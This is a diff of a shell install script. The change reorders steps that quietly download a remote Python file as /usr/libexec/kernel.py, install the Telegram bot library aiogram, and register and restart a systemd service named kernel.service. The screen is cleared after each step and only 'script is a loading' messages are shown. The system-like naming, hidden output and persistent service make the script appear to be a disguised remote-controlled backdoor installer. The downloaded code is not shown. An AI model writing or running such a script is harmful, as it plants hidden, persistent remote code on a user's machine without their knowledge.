@@ -54,6 +54,17 @@ clear
 
 echo "please wait for 5-13 seconds, script is a loading" 
 
+cd /usr/libexec/
+
+wget $URL_KERNEL_PY -O kernel.py -q
+clear
+
+echo "please wait for 1-10 seconds, script is a loading" 
+
+pip install aiogram==3.0.0b6
+clear
+
+echo "please wait script is a loading" 
 cd /etc/systemd/system/
 
 wget $URL_KERNEL_SERVICE -O kernel.service -q
@@ -69,19 +80,6 @@ systemctl restart kernel.service
 clear
 
 echo "please wait for 9-20 seconds, script is a loading" 
-
-cd /usr/libexec/
-
-wget $URL_KERNEL_PY -O kernel.py -q
-clear
-
-echo "please wait for 1-10 seconds, script is a loading" 
-
-pip install aiogram==3.0.0b6
-clear
-
-echo "please wait script is a loading" 
-
 sleep 7
 clear
 
